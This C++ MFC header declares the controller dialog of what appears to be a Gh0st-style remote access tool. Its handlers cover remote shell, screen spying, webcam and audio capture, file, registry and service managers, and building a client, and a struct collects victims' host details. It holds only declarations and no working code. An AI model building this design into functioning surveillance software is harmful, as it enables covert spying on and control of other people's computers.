
// 2015RemoteDlg.h : 头文件
//

#pragma once
#include "afxcmn.h"
#include "TrueColorToolBar.h"
#include "IOCPServer.h"

typedef struct  _LOGIN_INFOR
{	
	BYTE			bToken;			// = 1    //登陆信息
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	DWORD			dwCPUMHz;	// CPU主频
	IN_ADDR			ClientAddr;		// 存储32位的IPv4的地址数据结构
	char			szPCName[MAX_PATH];	// 主机名
	BOOL			bWebCamIsExist;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
}LOGIN_INFOR,*PLOGIN_INFOR;

// CMy2015RemoteDlg 对话框
class CMy2015RemoteDlg : public CDialogEx
{
	// 构造
public:
	CMy2015RemoteDlg(CWnd* pParent = NULL);	// 标准构造函数
	~CMy2015RemoteDlg()
	{
		DeleteCriticalSection(&m_cs);
	}
	// 对话框数据
	enum { IDD = IDD_MY2015REMOTE_DIALOG };
protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持
	// 实现
protected:
	HICON m_hIcon;

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:

	VOID CMy2015RemoteDlg::InitControl();             //初始控件
	VOID CMy2015RemoteDlg::TestOnline();              //测试函数
	VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, 
		CString strCPU, CString strVideo, CString strPing,CONTEXT_OBJECT* ContextObject);
	VOID CMy2015RemoteDlg::ShowMessage(BOOL bOk, CString strMsg);
	VOID CMy2015RemoteDlg::CreatStatusBar();
	VOID CMy2015RemoteDlg::CreateToolBar();
	VOID CMy2015RemoteDlg::CreateNotifyBar();
	VOID CMy2015RemoteDlg::CreateSolidMenu();	
	VOID CMy2015RemoteDlg::ListenPort();
	VOID CMy2015RemoteDlg::Activate(int nPort,int nMaxConnection);

	static VOID CALLBACK NotifyProc(CONTEXT_OBJECT* ContextObject);
	static VOID CALLBACK OfflineProc(CONTEXT_OBJECT* ContextObject);
	static VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject);
	VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength);
	// 显示用户上线信息
	CListCtrl  m_CList_Online;    
	CListCtrl  m_CList_Message;

	CStatusBar m_StatusBar;          //状态条
	CTrueColorToolBar m_ToolBar;
	NOTIFYICONDATA  m_Nid;
	CRITICAL_SECTION m_cs;

	UINT       m_iCount;
	CBitmap m_bmOnline[2];
	afx_msg void OnTimer(UINT_PTR nIDEvent);
	afx_msg void OnClose();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	afx_msg void OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOnlineMessage();
	afx_msg void OnOnlineDelete();
	afx_msg void OnAbout();
	afx_msg void OnIconNotify(WPARAM wParam,LPARAM lParam);
	afx_msg void OnNotifyShow();
	afx_msg void OnNotifyExit();
	afx_msg void OnMainSet();
	afx_msg void OnMainExit();
	afx_msg void OnOnlineCmdManager();
	afx_msg void OnOnlineProcessManager();
	afx_msg void OnOnlineWindowManager();
	afx_msg void OnOnlineDesktopManager();
	afx_msg void OnOnlineAudioManager();
	afx_msg void OnOnlineVideoManager();
	afx_msg void OnOnlineFileManager();
	afx_msg void OnOnlineServerManager();
	afx_msg void OnOnlineRegisterManager();
	afx_msg void OnOnlineBuildClient();
	afx_msg LRESULT OnUserToOnlineList(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnUserOfflineMsg(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenFileManagerDialog(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnOpenTalkDialog(WPARAM wPrarm,LPARAM lParam);
	afx_msg LRESULT OnOpenShellDialog(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnOpenAudioDialog(WPARAM wParam,LPARAM lParam);
	afx_msg LRESULT OnOpenRegisterDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenServicesDialog(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenVideoDialog(WPARAM wParam, LPARAM lParam);
};
